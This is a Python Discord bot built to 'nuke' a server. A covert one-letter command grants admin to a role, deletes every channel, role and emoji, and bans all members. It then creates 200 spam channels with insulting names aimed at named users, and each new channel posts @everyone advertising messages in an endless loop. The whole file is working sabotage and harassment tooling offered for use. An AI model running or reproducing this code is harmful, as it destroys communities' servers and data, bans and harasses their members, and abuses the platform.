import os
import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio


token = os.environ['token']


SPAM_CHANNEL =  ["Lean1003 rác ez" , "i forgot my name non" , "Yasei rác" , "Kuposieurác","Kupo người rén nhất thế giới","Lean more like thằng siêu non","i forgot my name homeless ez","Nuked by Kuposieuquay ","oops ez","Never gonna give you up","Nuked by artian7337","L BOZO EZ","LMAO EZ"] 
SPAM_MESSAGE = ["@everyone Subscribe to: https://www.youtube.com/channel/UCe_0xfxZaWCUFEa1Vc0382A or Rick Astley will come to your house"]

client = commands.Bot(command_prefix=",")



@client.event
async def on_ready():
 
   await client.change_presence(activity=discord.Streaming(name="Kupo siêu rác ez", url="https://www.twitch.tv/#"))
  
print('''
prochadgamerkid

Ez Gaming: https://www.youtube.com/channel/UCe_0xfxZaWCUFEa1Vc0382A
''')
 
@client.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.logout()
    print (Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)

@client.command()
async def a(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "monke")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban("Alex Hunter#1925")
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
    await guild.create_text_channel("ManUnited")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 100)
        print(f"New Invite: {link}")
    amount = 200
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"nuked {guild.name} Successfully.")
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))

client.run(token, bot=True)